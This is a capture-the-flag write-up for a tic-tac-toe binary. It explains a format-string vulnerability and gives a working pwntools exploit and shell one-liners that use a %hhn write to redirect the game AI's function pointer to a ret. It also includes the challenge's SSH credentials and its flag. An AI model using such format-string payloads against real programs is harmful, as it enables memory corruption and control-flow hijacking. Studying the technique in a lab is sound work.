# Tic Tac Toe - Solution

Created by moka ([Discord](https://discordapp.com/users/661109271148101652))

## Description
> Can you beat me?
<br>
`ssh ttt@challenges2.hexionteam.com -p 3004`</br>
Password: `hexctf`

## Solution
the given executable is a tic-tac-toe game where the AI is unbeatable, and to get the flag you have to win.\
but there's a format string vulnerability we can use to win.
```c
puts("Please enter your name: ");
scanf("%24s", name);
getchar();
snprintf(message, 100, "Welcome %s!\n", name);
printf(message);
```

there's a global pointer storing the function the ai uses to calculate it's next move -\
and so if we overwrite `DIFFICULTY` with the address of a ret, we can immobilize the ai, and beat it.
```c
logic_func DIFFICULTY = IMPOSSIBLE;
```
<br>\
to do that we first need to connect through ssh to the remote and run the executable,\
 then we'll send a payload that overwrite the last bit of the function's address with 0xd4\
which will make it point to ret.
```python
r = ssh('ttt', 'challenges2.hexionteam.com', 3004, password="hexctf").process('./ttt')
fmt = b'%204c%10$hhnAAAA' + p64(0x603010)
# DIFFICULTY:
# IMPOSSIBLE (0x401cd5) -> ret (0x401cd4)
r.sendlineafter(':', fmt)
```

after that we'll send winning moves (place x and then move right etc)\
and then receive the flag.
```python
r.send(' a a qn\n') # win [(x x x) (     ) (     )]
r.recvuntil('hex')
print(b'hex' + r.recvuntil('}'))
```

other cute solutions using pure python:
```python
(python -c "print b'%204c%10\$hhnAAAA' + b'\x100\`'"; cat) | ./ttt
(python3 -c "print ('%204c%10\$hhnAAAA' + '\x100\`')"; cat) | ./ttt
```
<br>

Flag: `hexCTF{h3y_th4ts_ch3at1ng}`